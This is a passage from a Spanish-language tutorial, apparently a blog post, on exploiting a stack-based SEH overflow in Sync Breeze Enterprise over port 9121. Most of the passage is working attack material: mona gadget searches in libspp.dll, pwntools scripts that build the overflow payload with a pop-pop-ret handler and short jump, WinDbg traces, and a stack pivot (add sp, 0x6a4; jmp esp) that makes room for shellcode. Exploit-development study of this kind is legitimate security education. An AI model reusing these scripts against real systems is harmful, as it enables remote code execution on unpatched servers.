<p class="plain-text">Para encontrar un gadget que ejecute algunas de estas instrucciones primero necesitamos saber que <code class="language-plaintext highlighter-rouge">modulos</code> carga el programa que pertenezcan a el y no al sistema para esto podemos usar mona, solo hay <code class="language-plaintext highlighter-rouge">4</code> modulos 3 de ellos son librerias, sin embargo de estos solo podemos usar <code class="language-plaintext highlighter-rouge">1</code> ya que el resto tiene como base una dirección que contiene <code class="language-plaintext highlighter-rouge">00</code> y antes habiamos visto que el null byte era un badchar</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona modules -cm os=false
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py modules -cm os=false

---------- Mona command started on 2024-02-25 09:35:00 (v2.0, rev 635) ----------
[+] Processing arguments and criteria
    - Pointer access level : X
    - Module criteria : ['os=false']
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
----------------------------------------------------------------------------------------------------------------------------------------------
 Module info :
----------------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
----------------------------------------------------------------------------------------------------------------------------------------------
 0x00a10000 | 0x00ac4000 | 0x000b4000 | True   | False   | False | False |  False   | False  | -1.0- [libsync.dll] (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libsync.dll) 0x0  
 0x00830000 | 0x00904000 | 0x000d4000 | True   | False   | False | False |  False   | False  | -1.0- [libpal.dll] (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libpal.dll) 0x0
 0x10000000 | 0x10223000 | 0x00223000 | False  | False   | False | False |  False   | False  | -1.0- [libspp.dll] (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll) 0x0
 0x00400000 | 0x00462000 | 0x00062000 | False  | False   | False | False |  False   | False  | -1.0- [syncbrs.exe] (C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe) 0x0  
----------------------------------------------------------------------------------------------------------------------------------------------

[+] Preparing output file 'modules.txt'
    - (Re)setting logfile C:\mona\modules.txt</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que tenemos un modulo que no inicia con <code class="language-plaintext highlighter-rouge">00</code> y no tiene protecciones podemos usar mona para encontrar gadgets que nos ayuden a saltar al siguiente SEH, encontramos varios gadgets y deberiamos poder usar cualquiera de ellos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona seh -m libspp.dll -cpb '\x00\x02\x0a\x0d\xf8\xfd'
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py seh -m libspp.dll -cpb '\x00\x02\x0a\x0d\xf8\xfd'

---------- Mona command started on 2024-02-25 09:35:22 (v2.0, rev 635) ----------
[+] Processing arguments and criteria
    - Pointer access level : X
    - Only querying modules libspp.dll
    - Bad char filter will be applied to pointers : '\x00\x02\x0a\x0d\xf8\xfd' 
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] Querying 1 modules
    - Querying module libspp.dll
[+] Setting pointer access level criteria to 'R', to increase search results
    New pointer access level : R
[+] Preparing output file 'seh.txt'
    - (Re)setting logfile C:\mona\seh.txt
[+] Writing results to C:\mona\seh.txt
[+] Results : 
0x10132edc : pop ebx # pop edi # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x10136ce4 : pop ebx # pop edi # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x10137e1b : pop ebx # pop edi # ret  | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0  
0x1013a1ce : pop ebx # pop edi # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x10128eb9 : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x1012b7ee : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x1012e6dd : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x1014df0f : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x1015316b : pop esi # pop edi # ret  | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0  
0x10014286 : pop ebx # pop ecx # ret 0x08 |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x100129c8 : add esp,8 # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x1004d738 : add esp,8 # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x1004d76d : add esp,8 # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x10050be3 : add esp,8 # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x10083f4a : add esp,8 # ret  | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x1008c59a : add esp,8 # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x1008c5b7 : add esp,8 # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x1008e114 : add esp,8 # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x1008e12b : add esp,8 # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0
0x100b63d2 : add esp,8 # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll), 0x0

... Please wait while I'm processing all remaining results and writing everything to file...
[+] Done. Only the first 20 pointers are shown here. For more pointers, open C:\mona\seh.txt...
    Found a total of 1553 pointers</span>
</code></pre></div></div><br>


<p class="plain-text">Nuestro exploit ahora tendra como controlador el puntero a un <code class="language-plaintext highlighter-rouge">pop pop ret</code> que eliminara <code class="language-plaintext highlighter-rouge">8 bytes</code> del stack y retornara al puntero del siguiente SEH</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">124</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

nseh </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
seh </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x10132edc</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000 </span><span class="o">- </span><span class="no">len</span><span class="p">(payload))  

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(7cc.778): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=01bff944 ebx=01bff9c4 ecx=00000139 edx=00000302 esi=01bffa0c edi=00000138
eip=008edcce esp=01bff998 ebp=01bffec8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libpal!SCA_GetToken+0x4e:
008edcce 88042f          mov     byte ptr [edi+ebp],al      ds:002b:01c00000=??  

</span><span class="ro">0:000> </span><span class="p">!exchain
01bffe0c: libpal!md5_starts+149fb (0095d6eb)
libspp!SPP_ValueTrend::FormatValueString+f6cc (10132edc)
Invalid exception stack at 42424242</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de que el programa corrompe podemos establecer un <code class="language-plaintext highlighter-rouge">breakpoint</code> en el pop pop ret, podemos ver en <code class="language-plaintext highlighter-rouge">esp + 8</code> el puntero al siguiente SEH nuevamente</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp 0x10132edc

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=10132edc edx=77af8ac0 esi=00000000 edi=00000000  
eip=10132edc esp=01bff3e8 ebp=01bff408 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
libspp!SPP_ValueTrend::FormatValueString+0xf6cc:
10132edc 5b              pop     ebx

</span><span class="ro">0:000> </span><span class="p">dds esp L4
01bff3e8  77af8aa2
01bff3ec  01bff4e8
01bff3f0  01bfff44
01bff3f4  01bff538</span>
</code></pre></div></div><br>

<p class="plain-text">El primer <code class="language-plaintext highlighter-rouge">pop</code> elimina 4 bytes del stack, el segundo <code class="language-plaintext highlighter-rouge">pop</code> otros 4 bytes y el <code class="language-plaintext highlighter-rouge">ret</code> ejecuta lo que esta en la dirección almacenada en esp que es el siguiente SEH que vale <code class="language-plaintext highlighter-rouge">0x42424242</code> o <code class="language-plaintext highlighter-rouge">BBBB</code> que su valor en asm es <code class="language-plaintext highlighter-rouge">inc edx</code> repetido 4 veces</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=00000000 ebx=00000000 ecx=10132edc edx=77af8ac0 esi=00000000 edi=00000000  
eip=10132edc esp=01bff3e8 ebp=01bff408 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
libspp!SPP_ValueTrend::FormatValueString+0xf6cc:
10132edc 5b              pop     ebx

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=00000000  
eip=10132edd esp=01bff3ec ebp=01bff408 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
libspp!SPP_ValueTrend::FormatValueString+0xf6cd:
10132edd 5f              pop     edi

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01bff4e8  
eip=10132ede esp=01bff3f0 ebp=01bff408 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
libspp!SPP_ValueTrend::FormatValueString+0xf6ce:
10132ede c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01bff4e8  
eip=01bfff44 esp=01bff3f4 ebp=01bff408 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
01bfff44 42              inc     edx</span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos una forma de ejecutar codigo, sin embargo una vez que ejecute el <code class="language-plaintext highlighter-rouge">0x42424242</code> si intenta ejecuta la dirección del <code class="language-plaintext highlighter-rouge">controlador</code> como instruccion probablemente corrompa, la solución es saltar esos <code class="language-plaintext highlighter-rouge">8</code> bytes para llegar a las D's</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dds eip L8
01bfff44  42424242
01bfff48  10132edc
01bfff4c  44444444
01bfff50  44444444
01bfff54  44444444
01bfff58  44444444
01bfff5c  44444444
01bfff60  44444444</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora nuestro siguiente SEH toma como valor la instrucción <code class="language-plaintext highlighter-rouge">jmp $+8</code>, aunque esta solo pesa 2 bytes (<code class="language-plaintext highlighter-rouge">\xeb\x06</code>), necesitamos rellenar a 4 con A's para evitar problemas</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">124</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

nseh </span><span class="o">= </span><span class="p">asm(</span><span class="s">"jmp $+8"</span><span class="p">).ljust(</span><span class="mi">4</span><span class="p">, </span><span class="no">b</span><span class="s">"A"</span><span class="p">)
seh </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x10132edc</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000 </span><span class="o">- </span><span class="no">len</span><span class="p">(payload))  

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos el exploit, ejecutamos el <code class="language-plaintext highlighter-rouge">pop pop ret</code> y la siguiente instrucción sera el <code class="language-plaintext highlighter-rouge">jmp</code> corto que saltará a <code class="language-plaintext highlighter-rouge">0x01c0ff4c</code>, esta dirección es donde inician las <code class="language-plaintext highlighter-rouge">D's</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp 0x10132edc

</span><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=10132edc edx=77af8ac0 esi=00000000 edi=00000000  
eip=10132edc esp=01c0f3e8 ebp=01c0f408 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
libspp!SPP_ValueTrend::FormatValueString+0xf6cc:
10132edc 5b              pop     ebx

</span><span class="ro">0:000> </span><span class="p">pt
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c0f4e8 
eip=10132ede esp=01c0f3f0 ebp=01c0f408 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
libspp!SPP_ValueTrend::FormatValueString+0xf6ce:
10132ede c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c0f4e8  
eip=01c0ff44 esp=01c0f3f4 ebp=01c0f408 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
01c0ff44 eb06            jmp     01c0ff4c

</span><span class="ro">0:000> </span><span class="p">dds eip L4
01c0ff44  414106eb
01c0ff48  10132edc libspp!SPP_ValueTrend::FormatValueString+0xf6cc
01c0ff4c  44444444
01c0ff50  44444444</span>
</code></pre></div></div><br>

<p class="plain-text">Despues del <code class="language-plaintext highlighter-rouge">jmp</code> corto lo siguiente que ejecutara son las <code class="language-plaintext highlighter-rouge">D's</code> como instrucción por lo que si en lugar de D's enviamos un <code class="language-plaintext highlighter-rouge">shellcode</code> deberiamos poder ejecutarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c0f4e8  
eip=01c0ff4c esp=01c0f3f4 ebp=01c0f408 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
01c0ff4c 44              inc     esp

</span><span class="ro">0:000> </span><span class="p">dds eip L4
01c0ff4c  44444444
01c0ff50  44444444
01c0ff54  44444444
01c0ff58  44444444</span>
</code></pre></div></div><br>

</section>

<section class="post" id="pivot">
<br><h3 class="post-title">Stack Pivot</h3><br>

<p class="plain-text">Sin embargo no podemos solo enviar un shellcode ya que si miramos los bytes despues de escribir <code class="language-plaintext highlighter-rouge">180 D's</code> corta la cadena, este espacio no es suficiente para un <code class="language-plaintext highlighter-rouge">shellcode</code> por lo que necesitamos buscar una forma de obtener mas espacio</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db eip L100
01c0ff4c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0ff5c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0ff6c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0ff7c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0ff8c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0ff9c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0ffac  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0ffbc  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0ffcc  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0ffdc  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0ffec  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
01c0fffc  44 44 44 44 ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  DDDD????????????  
01c1000c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????  
01c1001c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????  
01c1002c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????  
01c1003c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????  </span>
</code></pre></div></div><br>

<p class="plain-text">¿Porque se corta la cadena? Esto ocurre debido a que el limite del stack es la dirección <code class="language-plaintext highlighter-rouge">0x01c0e000</code> por lo que no logra escribir mas allá de esa dirección</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!teb
TEB at 0037e000
    ExceptionList:        01c0f3fc
    StackBase:            01c10000
    StackLimit:           01c0e000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 0037e000
    EnvironmentPointer:   00000000
    ClientId:             00001adc . 00000918  
    RpcHandle:            00000000
    Tls Storage:          005dbc20
    PEB Address:          0035a000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que es probable que encontremos la cadena en algun lugar del stack podemos buscar los bytes del del siguiente SEH que son <code class="language-plaintext highlighter-rouge">eb 06 41 41</code> que aparece 2 veces, si sumamos los <code class="language-plaintext highlighter-rouge">8</code> bytes para saltar la estructura tenemos la dirección de las <code class="language-plaintext highlighter-rouge">D's</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">s -b 01c0e000 01c10000 eb 06 41 41
01c0fa88  eb 06 41 41 dc 2e 13 10-44 44 44 44 44 44 44 44  ..AA....DDDDDDDD
01c0ff4c  eb 06 41 41 dc 2e 13 10-44 44 44 44 44 44 44 44  ..AA....DDDDDDDD  

</span><span class="ro">0:000> </span><span class="p">? 01c0fa88 - esp + 8
Evaluate expression: 1692 = 0000069c</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit se podria ver asi, sumando a <code class="language-plaintext highlighter-rouge">esp</code> la diferencia con la dirección donde estan las <code class="language-plaintext highlighter-rouge">D's</code> para despues saltar a ellas, sin embargo nos olvidamos de algo importante que es el <code class="language-plaintext highlighter-rouge">tamaño</code> de estas instrucciones y el alineamiento de la pila</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"add sp, 0x69c"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jmp esp"</span><span class="p">)
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000</span><span class="o"> - </span><span class="no">len</span><span class="p">(payload))  </span>
</code></pre></div></div><br>

<p class="plain-text">El tamaño de el <code class="language-plaintext highlighter-rouge">add</code> y el <code class="language-plaintext highlighter-rouge">jmp</code> es de <code class="language-plaintext highlighter-rouge">7</code> bytes, pero para evitar problemas con el alineamiento del stack usaremos un numero divisible entre 4, podemos solo agregar un <code class="language-plaintext highlighter-rouge">nop</code> y ahora el tamaño es de <code class="language-plaintext highlighter-rouge">8</code> bytes que si es divisible entre <code class="language-plaintext highlighter-rouge">4</code> bytes del dword</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">-q
>>> from pwn import asm
>>> len(asm("add sp, 0x69c") + asm("jmp esp"))  
7
>>> len(asm("add sp, 0x69c") + asm("jmp esp") + asm("nop"))  
8
>>> </span>
</code></pre></div></div><br>

<p class="plain-text">Entonces al tamaño que teniamos le agregamos <code class="language-plaintext highlighter-rouge">8</code> bytes que es el tamaño de las instrucciones y nos queda <code class="language-plaintext highlighter-rouge">0x6a4</code> que será la diferencia entre el <code class="language-plaintext highlighter-rouge">esp</code> y las <code class="language-plaintext highlighter-rouge">D's</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">? 0x69c + 8
Evaluate expression: 1700 = 000006a4  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"add sp, 0x6a4"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jmp esp"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"nop"</span><span class="p">)
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000 </span><span class="o">- </span><span class="no">len</span><span class="p">(payload))  </span>
</code></pre></div></div><br>

<p class="plain-text">Después de ejecutar el <code class="language-plaintext highlighter-rouge">add</code> sumando la diferencia ejecutará un <code class="language-plaintext highlighter-rouge">jmp esp</code> y como el esp apunta a donde están las <code class="language-plaintext highlighter-rouge">D's</code> las ejecutara como instrucciones en ensamblador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c1f4e8  
eip=01c1ff4c esp=01c1f3f4 ebp=01c1f408 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
01c1ff4c 6681c4a406      add     sp,6A4h

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c1f4e8  
eip=01c1ff51 esp=01c1fa98 ebp=01c1f408 iopl=0         nv up ei ng nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282  
01c1ff51 ffe4            jmp     esp {01c1fa98}</span>
</code></pre></div></div><br>

<p class="plain-text">Esta vez la cadena no se corta y tenemos un tamaño suficiente para un <code class="language-plaintext highlighter-rouge">shellcode</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db esp L100
01c1fa98  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1faa8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fab8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fac8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
